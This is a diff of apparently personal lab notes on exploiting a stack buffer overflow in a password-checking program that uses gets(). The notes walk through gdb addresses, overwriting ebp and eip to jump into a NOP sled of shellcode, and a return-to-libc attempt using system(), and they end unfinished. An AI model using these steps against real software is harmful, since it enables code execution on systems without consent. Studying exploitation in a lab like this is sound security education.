@@ -24,14 +24,14 @@ set a break point at IsPasswordOkay then run until break and print Password addr
     7	  gets(Password);
 
 (gdb) print &Password
-    &Password = (char (*)[12]) 0xffffd054
+    &Password = (char (*)[12]) 0xffffd094
 
 (gdb) info registers
     ...
-    esp            0xffffd050
-    ebp            0xffffd068
+    esp            0xffffd090
+    ebp            0xffffd0a8
     ...
-    eip            0x8048471
+    eip            0x8048471 <IsPasswordOkay+6>
     ...
 
 the address of the array &Password is at ebp-0x14
@@ -49,7 +49,7 @@ this causes a segfault but also reveals what parts of the shellcode end up where
 
 (gdb) info registers
     ...
-    esp            0xffffd070	0xffffd070
+    esp            0xffffd070	0xffffd0b0
     ebp            0x31313131	0x31313131
     ...
     eip            0x31313131	0x31313131
@@ -59,7 +59,7 @@ in the original codeinjection.bin shell code, the 2 groups of "31 31 31 31" affe
 first 4 bytes changes ebp
 last 4 bytes changes eip
 
-have to write the addresses backwards so 0xffffd054 becomes 54 d0 ff ff
+have to write the addresses backwards so 0xffffd094 becomes 94 d0 ff ff
 
 it seems like the beginning bytes before the sequence of 8 bytes of "31" might not do stuff
 the group of "90" bytes after the "31"s forms the NOP sled since the hex 90 is a no-operation code
@@ -67,12 +67,13 @@ the actual part to launch the shell and execute ps is at the bottom of the NOP s
 
 Password array is size 12, the part to change ebp will start at Password[20], and the part to change eip will start at Password[24]
 The NOP sled then begins at Password[28], once execution gets there it will cycle over the NOPs and eventually execute the PS command
-&Password[20] = 0xffffd068
-&Password[24] = 0xffffd06c
-&Password[28] = 0xffffd070
+&Password     = 0xffffd094
+&Password[20] = 0xffffd0a8
+&Password[24] = 0xffffd0ac
+&Password[28] = 0xffffd0b0
 
 the goal is to locate the start of the NOP sled and change the eip to go there
-so the last 4 bytes in the group of "31"s is changed to 70 D0 FF FF
+so the last 4 bytes in the group of "31"s is changed to B0 D0 FF FF
 
 now when executing the modified shell code successful
 
@@ -101,7 +102,7 @@ We need to locate the entrypoint of the “system” function call and prepare t
 Steps:
 
 (gdb) display &system
-    &system = (<text variable, no debug info> *) 0xf7e2cda0 <system>
+    &system = (<text variable, no debug info> *) 0xf7e3c940 <system>
 
 trying to run with the original returntolibc.bin shell code fails
 
@@ -116,7 +117,7 @@ this causes a segfault but also reveals what parts of the shellcode end up where
 
 (gdb) info registers
     ...
-    esp            0xffffd070	0xffffd070
+    esp            0xffffd070	0xffffd0b0
     ebp            0x61616161	0x61616161
     ...
     eip            0x61616161	0x61616161
@@ -129,5 +130,14 @@ using the original shell code, it looks like some of the groups affect ebp and e
 the 6th group of bytes changes ebp
 the 7th group of bytes changes eip
 
-...
+&Password     = 0xffffd094
+&Password[20] = 0xffffd0a8
+&Password[24] = 0xffffd0ac
+&Password[28] = 0xffffd0b0
+
+???   
+
+
+
+
 
